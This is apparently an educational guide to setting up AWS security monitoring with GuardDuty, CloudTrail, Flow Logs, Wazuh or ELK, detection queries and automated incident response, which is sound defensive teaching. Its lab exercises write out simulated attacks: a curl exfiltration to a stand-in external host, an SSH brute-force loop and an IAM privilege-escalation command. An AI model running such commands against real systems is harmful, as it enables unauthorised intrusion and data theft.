# SIEM and Security Lab Setup Guide

## Overview

This guide provides step-by-step instructions for setting up security monitoring infrastructure to protect your AWS environment. Learn to detect threats, respond to incidents, and maintain compliance through practical, hands-on security operations.

## Table of Contents

1. [Why Security Monitoring Matters](#why-security-monitoring-matters)
2. [Security Lab Architecture](#security-lab-architecture)
3. [AWS Native Security Tools](#aws-native-security-tools)
4. [Open Source SIEM Setup](#open-source-siem-setup)
5. [Log Collection and Correlation](#log-collection-and-correlation)
6. [Detection Rules](#detection-rules)
7. [Incident Response Automation](#incident-response-automation)
8. [Security Lab Exercises](#security-lab-exercises)

## Why Security Monitoring Matters

### Real-World Threat Scenarios

**Scenario 1: Credential Compromise**
```
Attack Timeline:
09:00 - Attacker phishes team member
09:15 - Credentials stolen, used to access AWS
09:20 - Attacker creates new IAM user
09:25 - Launches crypto mining EC2 instances
09:30 - You notice bill is $5000/day

Without monitoring: Discovered when bill arrives (too late)
With monitoring: Alert at 09:20, stopped at 09:21 ($0.50 cost)
```

**Scenario 2: Data Exfiltration**
```
Attack Timeline:
14:00 - SQL injection in API endpoint
14:05 - Attacker dumps database
14:10 - 100GB of patient data uploaded to external server
14:15 - HIPAA breach, $1.5M fine

Without monitoring: Discovered months later during audit
With monitoring: Alert at 14:05, blocked at 14:06
```

**Scenario 3: Insider Threat**
```
Attack Timeline:
16:00 - Departing employee downloads source code
16:15 - Exports customer list
16:30 - Creates IAM backdoor user
17:00 - Employee officially offboarded

Without monitoring: Backdoor discovered 6 months later
With monitoring: All actions logged, backdoor prevented
```

### Cost of NOT Having Security Monitoring

```
Average Data Breach Costs (2024):
- Healthcare: $10.93M per breach
- Financial: $5.97M per breach
- Technology: $5.09M per breach

Time to Identify Breach:
- Without SIEM: 277 days average
- With SIEM: 27 days average

Your Capstone:
- Cost to implement monitoring: $50-100/month
- Cost of single breach: Could end project + legal liability
- ROI: Obvious
```

## Security Lab Architecture

### Layered Security Approach

```
┌─────────────────────────────────────────────────┐
│            Prevention Layer                     │
│  WAF, Shield, Security Groups, NACLs            │
└─────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────┐
│            Detection Layer (SIEM)               │
│  GuardDuty, CloudTrail, VPC Flow Logs           │
│  Application Logs, OS Logs                      │
└─────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────┐
│            Response Layer                       │
│  EventBridge, Lambda, Step Functions            │
│  Automated remediation, alerting                │
└─────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────┐
│            Recovery Layer                       │
│  Backups, DR plan, Incident playbooks           │
└─────────────────────────────────────────────────┘
```

### Components

**Data Sources:**
- CloudTrail (API activity)
- VPC Flow Logs (network traffic)
- GuardDuty (threat intelligence)
- CloudWatch Logs (application/system logs)
- WAF Logs (web attacks)
- Config (configuration changes)

**SIEM Platform:**
- Option 1: CloudWatch + Athena (AWS native)
- Option 2: Security Lake (AWS managed)
- Option 3: ELK Stack (self-hosted)
- Option 4: Wazuh (open source XDR)

**Response Automation:**
- EventBridge rules
- Lambda functions
- SNS notifications
- Step Functions workflows

## AWS Native Security Tools

### Step 1: Enable AWS GuardDuty

GuardDuty is AWS's threat detection service. It's essential and cheap.

```bash
# Enable GuardDuty in your account
aws guardduty create-detector \
  --enable \
  --finding-publishing-frequency FIFTEEN_MINUTES \
  --region us-east-1

# Get detector ID
DETECTOR_ID=$(aws guardduty list-detectors --query 'DetectorIds[0]' --output text)

echo "GuardDuty enabled. Detector ID: $DETECTOR_ID"
```

**Cost:** $0.50-2.00/month for student projects (very cheap)

**What it detects:**
- Compromised EC2 instances
- Reconnaissance activity
- Unusual API calls
- Compromised credentials
- Cryptocurrency mining
- Data exfiltration attempts

### Step 2: Enable CloudTrail

CloudTrail logs all API activity in your AWS account.

```bash
# Create S3 bucket for logs
aws s3 mb s3://your-cloudtrail-logs-bucket \
  --region us-east-1

# Apply bucket policy
cat > cloudtrail-bucket-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AWSCloudTrailAclCheck",
      "Effect": "Allow",
      "Principal": {
        "Service": "cloudtrail.amazonaws.com"
      },
      "Action": "s3:GetBucketAcl",
      "Resource": "arn:aws:s3:::your-cloudtrail-logs-bucket"
    },
    {
      "Sid": "AWSCloudTrailWrite",
      "Effect": "Allow",
      "Principal": {
        "Service": "cloudtrail.amazonaws.com"
      },
      "Action": "s3:PutObject",
      "Resource": "arn:aws:s3:::your-cloudtrail-logs-bucket/*",
      "Condition": {
        "StringEquals": {
          "s3:x-amz-acl": "bucket-owner-full-control"
        }
      }
    }
  ]
}
EOF

aws s3api put-bucket-policy \
  --bucket your-cloudtrail-logs-bucket \
  --policy file://cloudtrail-bucket-policy.json

# Enable CloudTrail
aws cloudtrail create-trail \
  --name project-security-trail \
  --s3-bucket-name your-cloudtrail-logs-bucket \
  --is-multi-region-trail \
  --enable-log-file-validation

# Start logging
aws cloudtrail start-logging \
  --name project-security-trail

echo "CloudTrail enabled and logging"
```

**Cost:** $2.00 + $0.10/100k events (first trail free)

**What it logs:**
- Every API call (who, what, when, from where)
- IAM changes
- EC2 actions
- S3 access
- Database queries
- Configuration changes

### Step 3: Enable VPC Flow Logs

Flow logs capture network traffic metadata.

```bash
# Create CloudWatch log group
aws logs create-log-group \
  --log-group-name /aws/vpc/flowlogs \
  --region us-east-1

# Create IAM role for Flow Logs
cat > flowlogs-trust-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "vpc-flow-logs.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

aws iam create-role \
  --role-name VPCFlowLogsRole \
  --assume-role-policy-document file://flowlogs-trust-policy.json

# Attach policy
cat > flowlogs-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents",
        "logs:DescribeLogGroups",
        "logs:DescribeLogStreams"
      ],
      "Resource": "*"
    }
  ]
}
EOF

aws iam put-role-policy \
  --role-name VPCFlowLogsRole \
  --policy-name VPCFlowLogsPolicy \
  --policy-document file://flowlogs-policy.json

# Enable Flow Logs
VPC_ID="vpc-xxxxx"  # Your VPC ID
ROLE_ARN=$(aws iam get-role --role-name VPCFlowLogsRole --query 'Role.Arn' --output text)

aws ec2 create-flow-logs \
  --resource-type VPC \
  --resource-ids $VPC_ID \
  --traffic-type ALL \
  --log-destination-type cloud-watch-logs \
  --log-group-name /aws/vpc/flowlogs \
  --deliver-logs-permission-arn $ROLE_ARN

echo "VPC Flow Logs enabled"
```

**Cost:** $0.50/GB ingested (typically $1-5/month)

**What it logs:**
- Source/destination IPs
- Ports and protocols
- Packet and byte counts
- Accept/reject decisions

### Step 4: AWS Config for Compliance

Config tracks resource configurations and compliance.

```bash
# Create S3 bucket for Config
aws s3 mb s3://your-config-logs-bucket

# Create Config role
aws iam create-role \
  --role-name AWSConfigRole \
  --assume-role-policy-document file://config-trust-policy.json

# Attach managed policy
aws iam attach-role-policy \
  --role-name AWSConfigRole \
  --policy-arn arn:aws:iam::aws:policy/service-role/ConfigRole

# Create configuration recorder
aws configservice put-configuration-recorder \
  --configuration-recorder name=default,roleARN=arn:aws:iam::ACCOUNT_ID:role/AWSConfigRole \
  --recording-group allSupported=true,includeGlobalResourceTypes=true

# Create delivery channel
aws configservice put-delivery-channel \
  --delivery-channel name=default,s3BucketName=your-config-logs-bucket

# Start recording
aws configservice start-configuration-recorder \
  --configuration-recorder-name default

echo "AWS Config enabled"
```

**Cost:** $0.003/item recorded (~$2-10/month)

**What it tracks:**
- Resource configuration changes
- Compliance with rules
- Relationship between resources
- Configuration history

## Open Source SIEM Setup

### Option 1: Wazuh (Recommended for Students)

Wazuh is a free, open-source security platform combining SIEM, XDR, and compliance.

**Architecture:**
```
AWS Resources → CloudWatch → Wazuh Agent → Wazuh Manager → Dashboard
                   ↓
              GuardDuty → Wazuh → Alerts → SNS → Your Phone
```

**Installation:**

```bash
# Launch EC2 instance for Wazuh
# Recommended: t3.xlarge (4 vCPU, 16GB RAM)
# OS: Ubuntu 22.04 LTS

# SSH into instance
ssh -i your-key.pem ubuntu@wazuh-server-ip

# Install Wazuh
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash ./wazuh-install.sh -a

# Save the password displayed at the end!

# Access dashboard
# https://wazuh-server-ip
# Username: admin
# Password: (from installation)
```

**Configure AWS Integration:**

```bash
# On Wazuh server, edit ossec.conf
sudo nano /var/ossec/etc/ossec.conf

# Add AWS module configuration
<wodle name="aws-s3">
  <disabled>no</disabled>
  <interval>10m</interval>
  <run_on_start>yes</run_on_start>
  <skip_on_error>yes</skip_on_error>
  
  <!-- GuardDuty -->
  <bucket type="guardduty">
    <name>your-guardduty-bucket</name>
    <aws_profile>default</aws_profile>
  </bucket>
  
  <!-- CloudTrail -->
  <bucket type="cloudtrail">
    <name>your-cloudtrail-logs-bucket</name>
    <aws_profile>default</aws_profile>
  </bucket>
  
  <!-- VPC Flow Logs -->
  <bucket type="vpcflow">
    <name>your-flowlogs-bucket</name>
    <aws_profile>default</aws_profile>
  </bucket>
  
  <!-- Config -->
  <bucket type="config">
    <name>your-config-logs-bucket</name>
    <aws_profile>default</aws_profile>
  </bucket>
</wodle>

# Restart Wazuh
sudo systemctl restart wazuh-manager
```

**Install Agents on EC2 Instances:**

```bash
# On each EC2 instance you want to monitor
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg

echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list

apt-get update
apt-get install wazuh-agent

# Configure agent
WAZUH_MANAGER="wazuh-server-ip" apt-get install wazuh-agent

# Start agent
systemctl daemon-reload
systemctl enable wazuh-agent
systemctl start wazuh-agent
```

**Cost:** $80-120/month (t3.xlarge EC2) or free if you use your laptop

### Option 2: ELK Stack (Elasticsearch, Logstash, Kibana)

**Quick Setup:**

```bash
# Using Docker Compose
cat > docker-compose.yml <<EOF
version: '3.7'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
    ports:
      - 9200:9200
    volumes:
      - esdata:/usr/share/elasticsearch/data
  
  kibana:
    image: docker.elastic.co/kibana/kibana:8.11.0
    ports:
      - 5601:5601
    depends_on:
      - elasticsearch
  
  logstash:
    image: docker.elastic.co/logstash/logstash:8.11.0
    ports:
      - 5044:5044
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    depends_on:
      - elasticsearch

volumes:
  esdata:
EOF

docker-compose up -d

# Access Kibana at http://localhost:5601
```

## Log Collection and Correlation

### CloudWatch Logs Agent Setup

```bash
# Install CloudWatch agent on EC2
wget https://s3.amazonaws.com/amazoncloudwatch-agent/ubuntu/amd64/latest/amazon-cloudwatch-agent.deb
sudo dpkg -i -E ./amazon-cloudwatch-agent.deb

# Create configuration
sudo cat > /opt/aws/amazon-cloudwatch-agent/etc/config.json <<EOF
{
  "logs": {
    "logs_collected": {
      "files": {
        "collect_list": [
          {
            "file_path": "/var/log/syslog",
            "log_group_name": "/aws/ec2/syslog",
            "log_stream_name": "{instance_id}"
          },
          {
            "file_path": "/var/log/auth.log",
            "log_group_name": "/aws/ec2/auth",
            "log_stream_name": "{instance_id}"
          },
          {
            "file_path": "/var/log/application/*.log",
            "log_group_name": "/aws/application/logs",
            "log_stream_name": "{instance_id}"
          }
        ]
      }
    }
  }
}
EOF

# Start agent
sudo /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
  -a fetch-config \
  -m ec2 \
  -s \
  -c file:/opt/aws/amazon-cloudwatch-agent/etc/config.json
```

### Structured Logging Best Practices

```python
# Good: Structured JSON logs
import json
import logging

logger = logging.getLogger()

def log_security_event(event_type, user, action, resource, result):
    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "event_type": event_type,
        "user": user,
        "action": action,
        "resource": resource,
        "result": result,
        "source_ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent'),
        "correlation_id": request.headers.get('X-Correlation-ID')
    }
    logger.info(json.dumps(log_entry))

# Usage
log_security_event(
    event_type="authentication",
    user="admin@example.com",
    action="login",
    resource="api",
    result="success"
)
```

## Detection Rules

### GuardDuty Alert Response

```python
# Lambda function triggered by GuardDuty findings
import boto3
import json

def lambda_handler(event, context):
    # Parse GuardDuty finding
    finding = event['detail']
    severity = finding['severity']
    finding_type = finding['type']
    
    # High severity findings
    if severity >= 7.0:
        # Isolate EC2 instance
        if 'UnauthorizedAccess:EC2' in finding_type:
            instance_id = finding['resource']['instanceDetails']['instanceId']
            isolate_instance(instance_id)
            notify_team(f"CRITICAL: Instance {instance_id} isolated due to {finding_type}")
        
        # Disable compromised IAM credentials
        if 'UnauthorizedAccess:IAMUser' in finding_type:
            username = finding['resource']['accessKeyDetails']['userName']
            disable_user_keys(username)
            notify_team(f"CRITICAL: IAM user {username} keys disabled due to {finding_type}")
    
    return {'statusCode': 200}

def isolate_instance(instance_id):
    ec2 = boto3.client('ec2')
    
    # Create isolated security group
    sg = ec2.create_security_group(
        GroupName=f'quarantine-{instance_id}',
        Description='Quarantine security group - blocks all traffic'
    )
    
    # Remove all rules (deny all traffic)
    # Apply to instance
    ec2.modify_instance_attribute(
        InstanceId=instance_id,
        Groups=[sg['GroupId']]
    )

def disable_user_keys(username):
    iam = boto3.client('iam')
    
    # List access keys
    keys = iam.list_access_keys(UserName=username)
    
    # Disable all keys
    for key in keys['AccessKeyMetadata']:
        iam.update_access_key(
            UserName=username,
            AccessKeyId=key['AccessKeyId'],
            Status='Inactive'
        )

def notify_team(message):
    sns = boto3.client('sns')
    sns.publish(
        TopicArn='arn:aws:sns:us-east-1:ACCOUNT_ID:security-alerts',
        Subject='Security Alert',
        Message=message
    )
```

### Custom Detection Rules

```sql
-- CloudWatch Logs Insights queries for security events

-- 1. Failed SSH login attempts
fields @timestamp, user, source_ip
| filter @message like /Failed password/
| stats count() by source_ip
| filter count > 5
| sort count desc

-- 2. Unusual API activity
fields @timestamp, userIdentity.principalId, eventName, sourceIPAddress
| filter eventName not in ["AssumeRole", "GetCallerIdentity", "DescribeInstances"]
| stats count() by eventName
| filter count < 5
| sort @timestamp desc

-- 3. Large data transfers
fields @timestamp, bytes, src_addr, dst_addr
| filter bytes > 1000000000  # >1GB
| filter dst_addr not like "10.0."  # External destination
| sort bytes desc

-- 4. Privilege escalation attempts
fields @timestamp, userIdentity.principalId, eventName
| filter eventName in ["PutUserPolicy", "AttachUserPolicy", "CreateAccessKey", "UpdateAccessKey"]
| stats count() by userIdentity.principalId
| sort count desc
```

## Incident Response Automation

### EventBridge Rules

```json
{
  "source": ["aws.guardduty"],
  "detail-type": ["GuardDuty Finding"],
  "detail": {
    "severity": [
      {"numeric": [">=", 7]}
    ]
  }
}
```

### Step Functions Workflow

```json
{
  "Comment": "Security Incident Response Workflow",
  "StartAt": "ClassifyFinding",
  "States": {
    "ClassifyFinding": {
      "Type": "Choice",
      "Choices": [
        {
          "Variable": "$.detail.type",
          "StringMatches": "*EC2*",
          "Next": "IsolateEC2Instance"
        },
        {
          "Variable": "$.detail.type",
          "StringMatches": "*IAM*",
          "Next": "DisableIAMUser"
        }
      ],
      "Default": "NotifySecurityTeam"
    },
    "IsolateEC2Instance": {
      "Type": "Task",
      "Resource": "arn:aws:lambda:REGION:ACCOUNT:function:isolate-instance",
      "Next": "CreateTicket"
    },
    "DisableIAMUser": {
      "Type": "Task",
      "Resource": "arn:aws:lambda:REGION:ACCOUNT:function:disable-user",
      "Next": "CreateTicket"
    },
    "CreateTicket": {
      "Type": "Task",
      "Resource": "arn:aws:lambda:REGION:ACCOUNT:function:create-ticket",
      "Next": "NotifySecurityTeam"
    },
    "NotifySecurityTeam": {
      "Type": "Task",
      "Resource": "arn:aws:sns:REGION:ACCOUNT:security-alerts",
      "End": true
    }
  }
}
```

## Security Lab Exercises

### Exercise 1: Detect Brute Force Attack

**Objective:** Detect and block SSH brute force attempts

**Setup:**
1. Enable VPC Flow Logs
2. Create CloudWatch metric filter
3. Set up alarm

**Test:**
```bash
# Simulate brute force (from external machine)
for i in {1..20}; do
  ssh baduser@your-ec2-ip
done
```

**Expected:**
- CloudWatch alarm triggers
- Lambda blocks source IP
- SNS notification sent

### Exercise 2: Detect Data Exfiltration

**Objective:** Identify unusual outbound data transfer

**Setup:**
1. Enable VPC Flow Logs
2. Create baseline of normal traffic
3. Set up anomaly detection

**Test:**
```bash
# Simulate large upload
dd if=/dev/zero bs=1M count=1000 | curl -X POST -d @- http://external-server.com/upload
```

**Expected:**
- Flow log shows large outbound transfer
- Alert generated for unusual volume
- Investigation triggered

### Exercise 3: Compromised Credentials

**Objective:** Detect use of stolen IAM keys

**Setup:**
1. Enable CloudTrail
2. Configure GuardDuty
3. Set up geographic monitoring

**Test:**
```bash
# Use AWS CLI from unusual location (e.g., VPN to different country)
aws s3 ls
```

**Expected:**
- GuardDuty detects unusual API call location
- Keys automatically disabled
- User notified to rotate credentials

### Exercise 4: Insider Threat

**Objective:** Detect privilege escalation

**Setup:**
1. Enable CloudTrail
2. Monitor IAM policy changes
3. Alert on sensitive actions

**Test:**
```bash
# Attempt to escalate privileges
aws iam attach-user-policy \
  --user-name test-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**Expected:**
- CloudTrail logs policy attachment
- Alert sent immediately
- Action logged for review

## Summary

**Key Takeaways:**

1. **Defense in Depth**: Multiple layers of security
2. **Detect, Don't Just Prevent**: Assume breach mindset
3. **Automate Response**: Seconds matter in security
4. **Log Everything**: You can't investigate what you didn't log
5. **Practice**: Run drills, test your defenses

**Essential Components:**
- GuardDuty: Threat detection
- CloudTrail: API audit log
- VPC Flow Logs: Network monitoring
- CloudWatch: Centralized logging
- SIEM: Correlation and analysis
- Automation: Fast response

**Cost for Student Project:**
- AWS native tools: $5-15/month
- With Wazuh: $80-120/month (or free on laptop)
- Without security: Potentially millions in breach costs

**Next Steps:**
1. Enable all AWS security services (30 minutes)
2. Setup CloudWatch dashboards (1 hour)
3. Deploy Wazuh or ELK (2-4 hours)
4. Create detection rules (ongoing)
5. Practice incident response (weekly)

You now have the foundation to build production-grade security monitoring. These skills are directly applicable to SOC analyst, security engineer, and DevSecOps roles.

## References

- **AWS Security Best Practices**: https://aws.amazon.com/security/best-practices/
- **Wazuh Documentation**: https://documentation.wazuh.com/
- **MITRE ATT&CK**: https://attack.mitre.org/
- **CIS AWS Foundations Benchmark**: https://www.cisecurity.org/benchmark/amazon_web_services

Protect your infrastructure. Security is not optional.

